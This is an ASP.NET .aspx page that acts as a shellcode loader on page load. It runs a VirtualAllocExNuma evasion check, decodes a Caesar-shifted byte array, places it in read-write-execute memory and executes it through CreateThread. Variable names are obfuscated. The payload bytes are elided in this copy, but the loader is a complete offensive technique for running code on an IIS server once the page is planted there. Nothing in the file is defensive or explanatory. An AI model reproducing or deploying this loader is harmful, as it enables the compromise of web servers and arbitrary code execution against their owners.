<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

[System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[System.Runtime.InteropServices.DllImport("kernel32.dll")]
private static extern IntPtr GetCurrentProcess();

    protected void Page_Load(object sender, EventArgs e)
    {

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if(mem == null)
    {
        return;
    }

<%-- output from caesar cipher --%>
byte[] vL8fwOy_ = new byte[807] {   
0xff, 0xab ... 0x92
};


for(int i = 0; i < vL8fwOy_.Length; i++)
{
    vL8fwOy_[i] = (byte)(((uint)vL8fwOy_[i] - 5) & 0xFF);
}

        IntPtr ueQ10jlu8 = VirtualAlloc(IntPtr.Zero,(UIntPtr)vL8fwOy_.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(vL8fwOy_,0,ueQ10jlu8,vL8fwOy_.Length);
        IntPtr zG2cp6Es = IntPtr.Zero;
        IntPtr sim0id = CreateThread(IntPtr.Zero,UIntPtr.Zero,ueQ10jlu8,IntPtr.Zero,0,ref zG2cp6Es);
    }
</script>
